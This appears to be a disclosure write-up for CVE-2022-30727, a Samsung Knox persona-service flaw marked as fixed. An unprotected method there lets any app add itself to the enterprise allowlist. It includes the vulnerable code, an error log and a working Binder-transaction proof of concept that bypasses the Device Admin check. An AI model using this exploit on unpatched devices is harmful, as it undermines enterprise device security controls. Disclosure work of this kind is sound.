# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.29</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.06.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-30727">CVE-2022-30727</a> (SVE-2022-0793)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$3200</td>
    </tr>
</table>

# Description

The system service `persona` (`com.samsung.android.knox.ISemPersonaManager`) contained a method `com.android.server.pm.PersonaManagerService.addAppPackageNameToAllowList()` that was not protected in any way:
```java
@Override
public void addAppPackageNameToAllowList(int userId, List<String> appInstallationList) {
    long token = Binder.clearCallingIdentity();
    try {
        EdmStorageProvider edmStorageProvider = new EdmStorageProvider(this.mContext);
        if (userId != 0) {
            int oUid = edmStorageProvider.getMUMContainerOwnerUid(userId);
            EnterpriseKnoxManager ekm = EnterpriseKnoxManager.getInstance();
            KnoxContainerManager kmcm = ekm.getKnoxContainerManager(this.mContext, new ContextInfo(oUid, userId));
            for (String appName : appInstallationList) {
                try {
                    Log.d("PersonaManagerService", "add package to Allowlist : " + appName);
                    if (kmcm != null) {
                        kmcm.getApplicationPolicy().addAppPackageNameToWhiteList(appName);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    } finally {
        Binder.restoreCallingIdentity(token);
    }
}
```

The original method `com.samsung.android.knox.application.ApplicationPolicy.addAppPackageNameToWhiteList()` requires the calling app to be a Device Admin. Therefore, if you call it directly:
```java
Class edmClass = Class.forName("com.samsung.android.knox.EnterpriseDeviceManager");
Object edm = edmClass.getMethod("getInstance", Context.class).invoke(null, this);
Object appPolicy = edmClass.getMethod("getApplicationPolicy").invoke(edm);
try {
    boolean result = (boolean) appPolicy.getClass()
            .getMethod("addAppPackageNameToWhiteList", String.class)
            .invoke(appPolicy, getPackageName());
} catch (Throwable th) {
    throw new RuntimeException(th);
}
```

Then you'll get the following exception:
```
03-29 16:15:07.271 29049 29049 E AndroidRuntime: Caused by: java.lang.SecurityException: No active admin owned by uid 10577
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at android.os.Parcel.createExceptionOrNull(Parcel.java:2437)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at android.os.Parcel.createException(Parcel.java:2421)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at android.os.Parcel.readException(Parcel.java:2404)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at android.os.Parcel.readException(Parcel.java:2346)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at com.samsung.android.knox.application.IApplicationPolicy$Stub$Proxy.addAppPackageNameToWhiteList(IApplicationPolicy.java:5810)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at com.samsung.android.knox.application.ApplicationPolicy.addAppPackageNameToWhiteList(ApplicationPolicy.java:1696)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    ... 18 more
03-29 16:15:07.271 29049 29049 E AndroidRuntime: Caused by: android.os.RemoteException: Remote stack trace:
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at com.android.server.enterprise.EnterpriseDeviceManagerServiceImpl.enforceActiveAdminPermissionByContext(EnterpriseDeviceManagerServiceImpl.java:922)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at com.android.server.enterprise.EnterpriseDeviceManagerServiceImpl.enforceActiveAdminPermissionByContext(EnterpriseDeviceManagerServiceImpl.java:671)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at com.samsung.android.knox.EnterpriseDeviceManager.enforceActiveAdminPermissionByContext(EnterpriseDeviceManager.java:948)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at com.android.server.enterprise.application.ApplicationPolicy.enforceAppPermission(ApplicationPolicy.java:693)
03-29 16:15:07.271 29049 29049 E AndroidRuntime:    at com.android.server.enterprise.application.ApplicationPolicy.addAppPackageNameToWhiteList(ApplicationPolicy.java:6366)
```

**Proof of Concept**
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
                .getMethod("getService", String.class)
                .invoke(null, "persona");
        processBinder(binder);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private void processBinder(IBinder binder) {
    try {
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken("com.samsung.android.knox.ISemPersonaManager");
        parcel.writeInt(Process.myUid());
        parcel.writeStringList(List.of(getPackageName()));

        Parcel reply = Parcel.obtain();

        binder.transact(25, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
